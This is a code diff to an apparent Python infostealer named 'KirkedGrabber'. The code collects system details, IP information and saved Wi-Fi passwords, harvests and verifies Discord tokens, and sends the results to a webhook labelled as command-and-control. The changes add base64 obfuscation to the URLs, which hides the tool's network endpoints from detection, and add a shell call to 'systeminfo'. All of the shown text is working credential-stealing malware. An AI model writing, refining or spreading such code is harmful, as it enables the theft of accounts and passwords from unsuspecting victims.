@@ -152,6 +152,7 @@ def systeminfo():
     sysinfooutput = os.path.join(syst_, 'System.txt')
     ipoutput = os.path.join(syst_, 'IP Info.txt')
     ram = psutil.virtual_memory()
+    information = subprocess.run('systeminfo', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
     ip_info = requests.get(base64.b64decode('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==').decode('utf-8'))
     sys_lines = []
     ip_lines = []
@@ -165,20 +166,17 @@ def systeminfo():
         ip_lines.append(f'ORGANIZATION: {ipinf.get("org", "None")}')
         ip_lines.append(f'TIMEZONE: {ipinf.get("timezone", "None")}')
         
-    
-    sys_lines.append(f'USERNAME: {username}')
-    sys_lines.append(f'COMPUTER NAME: {pcname.upper()}')
-    sys_lines.append(f'OS: {plat}')
-    sys_lines.append(f'MACHINE: {platform.machine()}')
-    sys_lines.append(f'PROCESSOR: {platform.processor()}')
-    sys_lines.append(f"RAM: {round(ram.total / (1024 ** 3), 2)} GB")
+    sys_lines.append(information)
+    sys_lines.append('=======================================')
     sys_lines.append(f'HWID: {hwid}')
-    sys_lines.append('\nWIFI:')
+    sys_lines.append('=======================================')
     wifiprofiles = len(wifilist)
-    for network, password in wifilist:
-        sys_lines.append(f'{network}: {password}')
-    write(sysinfooutput, '\n'.join(sys_lines))
-    write(ipoutput, '\n'.join(ip_lines))
+    if wifiprofiles != 0:
+        sys_lines.append('\nWIFI:')
+        for network, password in wifilist:
+            sys_lines.append(f'{network}: {password}')
+        write(sysinfooutput, '\n'.join(sys_lines))
+        write(ipoutput, '\n'.join(ip_lines))
 
 def screenshot():
     syst_ = os.path.join(output, 'System')
@@ -443,7 +441,7 @@ def stealgecko():
                    pass
 
 
-def stealdiscord(): #stole this from my token stealer https://github.com/xvhjs2/tknstealer-v2
+def stealdiscord(): #stole this from my token stealer 
     tokens = set()
     
     regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
@@ -585,7 +583,7 @@ def verify(token):
     'authorization': token,
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
     }
-    v = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+    v = requests.get(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'), headers=headers)
     if v.status_code in [200, 201, 204]:
         return v.json()
     else:
@@ -736,12 +734,12 @@ def sendtoc2(file):
                 "name": "KirkG"
               },
               "thumbnail": {
-                "url": "https://raw.githubusercontent.com/xvhjs2/KirkedGrabber/refs/heads/main/resources/turningpoint.jpg"
+                "url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvdHVybmluZ3BvaW50LmpwZw==").decode('utf-8')
               }
             }
           ],
           "username": "Charlie Kirk",
-          "avatar_url": "https://raw.githubusercontent.com/xvhjs2/KirkedGrabber/refs/heads/main/resources/charlie%20kirk.jpg"
+          "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvY2hhcmxpZSUyMGtpcmsuanBn").decode('utf-8')
     }
         r = requests.post(webhookurl, json=payload)
         # print(r.text)
